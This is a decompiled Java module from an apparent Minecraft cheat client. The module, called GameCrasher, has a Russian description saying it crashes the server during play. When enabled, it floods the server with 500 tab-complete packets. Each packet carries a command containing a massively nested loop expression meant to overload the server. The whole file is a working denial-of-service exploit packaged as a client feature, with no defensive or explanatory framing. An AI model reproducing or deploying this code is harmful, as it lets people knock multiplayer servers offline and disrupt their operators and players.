/*
 * Decompiled with CFR 0.150.
 */
package org.celestial.client.feature.impl.misc;

import net.minecraft.network.play.client.CPacketTabComplete;
import net.minecraft.util.math.BlockPos;
import org.celestial.client.feature.Feature;
import org.celestial.client.feature.impl.Type;

public class GameCrasher
extends Feature {
    public GameCrasher() {
        super("GameCrasher", "\u041a\u0440\u0430\u0448\u0438\u0442 \u0441\u0435\u0440\u0432\u0435\u0440 \u0432\u043e \u0432\u0440\u0435\u043c\u044f \u0438\u0433\u0440\u044b", Type.Misc);
    }

    @Override
    public void onEnable() {
        for (int i = 0; i < 500; ++i) {
            GameCrasher.mc.player.connection.sendPacket(new CPacketTabComplete("/to for(i=0;i<99999;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(a=0;a<256;a++){ln(pi)}}}}", new BlockPos(GameCrasher.mc.player.posX, GameCrasher.mc.player.posY, GameCrasher.mc.player.posZ), false));
        }
        super.onEnable();
    }
}

